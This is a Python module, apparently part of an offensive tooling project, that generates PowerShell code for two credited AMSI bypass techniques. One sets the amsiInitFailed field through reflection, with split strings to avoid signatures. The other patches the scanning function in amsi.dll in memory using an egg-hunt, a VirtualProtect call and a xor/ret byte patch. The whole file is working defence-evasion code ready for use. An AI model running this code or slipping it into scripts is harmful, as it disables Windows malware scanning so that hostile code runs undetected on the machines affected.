import helpers.config


class Bypass:

    bypass_methods = helpers.config.BypassMethods

    def __init__(self) -> None:
        pass

    def execute_bypass(self, bypass_type):
        if bypass_type == self.bypass_methods.reflection:
            return self.get_reflection_code()
        elif bypass_type == self.bypass_methods.scan_buffer_laine:
            return self.get_laine_code()
        else:
            raise SystemExit("Not supported bypass type")

    """ This code has been obtained from https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell and 
    the credits are from Matt Graeber, who published this code on May 25th 2016 
    (https://twitter.com/mattifestation/status/735261120487772160). It has been changed a little
    bit for it to work properly. """

    def get_reflection_code(self):
        code = 'Write-Host "-- AMSI Reflection Method"\n'
        code = code + \
            'Write-Host "-- Credits: Matt Graeber (@mattifestation)"\n'
        code = code + 'Write-Host ""\r\n'
        code = code + '$var1="siUtils"\n'
        code = code + '$var2="nitFailed"\n'
        code = code + \
            '[Ref].Assembly.GetType("System.Management.Automation.Am$var1").GetField("amsiI$var2","NonPublic,Static").SetValue($null,$true)\n'
        return code

    """ This code has been obtained from https://www.contextis.com/us/blog/amsi-bypass and 
    the credits are from Paul Laine (@am0nsec) """

    def get_laine_code(self):
        code = 'Write-Host "-- AMSI Patch"\n'
        code = code + 'Write-Host "-- Paul Laine (@am0nsec)"\n'
        code = code + 'Write-Host ""\r\n'
        code = code + '$Kernel32 = @"\n'
        code = code + 'using System;\n'
        code = code + 'using System.Runtime.InteropServices;\r\n'
        code = code + 'public class Kernel32 {\n'
        code = code + '\t[DllImport("kernel32")]\n'
        code = code + \
            '\tpublic static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);\r\n'
        code = code + '\t[DllImport("kernel32")]\n'
        code = code + \
            '\tpublic static extern IntPtr LoadLibrary(string lpLibFileName);\r\n'
        code = code + '\t[DllImport("kernel32")]\n'
        code = code + \
            '\tpublic static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n'
        code = code + '}\n'
        code = code + '"@\n'
        code = code + 'Add-Type $Kernel32\n'
        code = code + 'Class Hunter {\n'
        code = code + \
            '\tstatic [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {\n'
        code = code + '\t\twhile ($true) {\n'
        code = code + '\t\t\t[int]$count = 0\n'
        code = code + '\t\t\twhile ($true) {\n'
        code = code + '\t\t\t\t[IntPtr]$address = [IntPtr]::Add($address, 1)\n'
        code = code + \
            '\t\t\t\tIf ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {\n'
        code = code + '\t\t\t\t\t$count++\n'
        code = code + '\t\t\t\t\tIf ($count -eq $egg.Length) {\n'
        code = code + \
            '\t\t\t\t\t\treturn [IntPtr]::Subtract($address, $egg.Length - 1)\n'
        code = code + '\t\t\t\t\t}\n'
        code = code + '\t\t\t\t} Else { break }\n'
        code = code + '\t\t\t}\n'
        code = code + '\t\t}\n'
        code = code + '\t\treturn $address\n'
        code = code + '\t}\n'
        code = code + '}\r\n'
        code = code + \
            '[IntPtr]$hModule = [Kernel32]::LoadLibrary("amsi.dll")\n'
        code = code + 'Write-Host "[+] AMSI DLL Handle: $hModule"\r\n'
        code = code + \
            '[IntPtr]$dllCanUnloadNowAddress = [Kernel32]::GetProcAddress($hModule, "DllCanUnloadNow")\n'
        code = code + \
            'Write-Host "[+] DllCanUnloadNow address: $dllCanUnloadNowAddress"\r\n'
        code = code + 'If ([IntPtr]::Size -eq 8) {\n'
        code = code + '\tWrite-Host "[+] 64-bits process"\n'
        code = code + '\t[byte[]]$egg = [byte[]] (\n'
        code = code + '\t\t0x4C, 0x8B, 0xDC,       # mov     r11,rsp\n'
        code = code + \
            '\t\t0x49, 0x89, 0x5B, 0x08, # mov     qword ptr [r11+8],rbx\n'
        code = code + \
            '\t\t0x49, 0x89, 0x6B, 0x10, # mov     qword ptr [r11+10h],rbp\n'
        code = code + \
            '\t\t0x49, 0x89, 0x73, 0x18, # mov     qword ptr [r11+18h],rsi\n'
        code = code + '\t\t0x57,                   # push    rdi\n'
        code = code + '\t\t0x41, 0x56,             # push    r14\n'
        code = code + '\t\t0x41, 0x57,             # push    r15\n'
        code = code + '\t\t0x48, 0x83, 0xEC, 0x70  # sub     rsp,70h\n'
        code = code + '\t)\n'
        code = code + '} Else {\n'
        code = code + '\tWrite-Host "[+] 32-bits process"\n'
        code = code + '\t[byte[]]$egg = [byte[]] (\n'
        code = code + '\t\t0x8B, 0xFF,             # mov     edi,edi\n'
        code = code + '\t\t0x55,                   # push    ebp\n'
        code = code + '\t\t0x8B, 0xEC,             # mov     ebp,esp\n'
        code = code + '\t\t0x83, 0xEC, 0x18,       # sub     esp,18h\n'
        code = code + '\t\t0x53,                   # push    ebx\n'
        code = code + '\t\t0x56                    # push    esi\n'
        code = code + '\t)\n'
        code = code + '}\n'
        code = code + \
            '[IntPtr]$targetedAddress = [Hunter]::FindAddress($dllCanUnloadNowAddress, $egg)\n'
        code = code + 'Write-Host "[+] Targeted address: $targetedAddress"\r\n'
        code = code + '$oldProtectionBuffer = 0\n'
        code = code + \
            '[Kernel32]::VirtualProtect($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | Out-Null\r\n'
        code = code + '$patch = [byte[]] (\n'
        code = code + '\t0x31, 0xC0,    # xor rax, rax\n'
        code = code + '\t0xC3           # ret  \n'
        code = code + ')\n'
        code = code + \
            '[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)\r\n'
        code = code + '$a = 0\n'
        code = code + \
            '[Kernel32]::VirtualProtect($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null\n'
        return code
